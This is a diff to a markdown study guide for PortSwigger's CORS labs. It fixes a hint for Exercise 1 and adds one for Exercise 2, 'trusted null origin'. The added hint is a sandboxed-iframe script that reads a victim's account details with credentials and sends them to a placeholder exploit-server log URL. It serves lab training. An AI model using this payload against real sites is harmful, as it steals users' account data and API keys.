@@ -12,8 +12,8 @@ CORS vulnerability with basic origin reflection
 <details>
   <summary>Hint</summary>
     
-    #This code my help you accessing logs  
-    #In your browser, go to the exploit server and enter the following HTML, replacing $url with your unique lab URL
+    #This code my help you access logs  
+    #In your browser, go to the exploit server and enter the following HTML, replacing $url with your unique lab URL  
   
     <script>
       var req = new XMLHttpRequest();
@@ -30,6 +30,28 @@ CORS vulnerability with basic origin reflection
 </details>
 
 ## Exercise 2
+CORS vulnerability with trusted null origin  
+> [Exercise_2](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
 
+<details>
+  <summary>Hint</summary>  
+    
+    #This code my help you access logs  
+    #In your browser, go to the exploit server and enter the following HTML, replacing $url with the URL for your unique lab URL and $exploit-server-url with the exploit server URL  
+  
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
+      srcdoc="<script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','$url/accountDetails',true);
+      req.withCredentials = true;
+      req.send();
+      function reqListener() {
+        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+      };
+      </script>">
+    </iframe>  
+  
+</details>
 
 ## Exercise 3
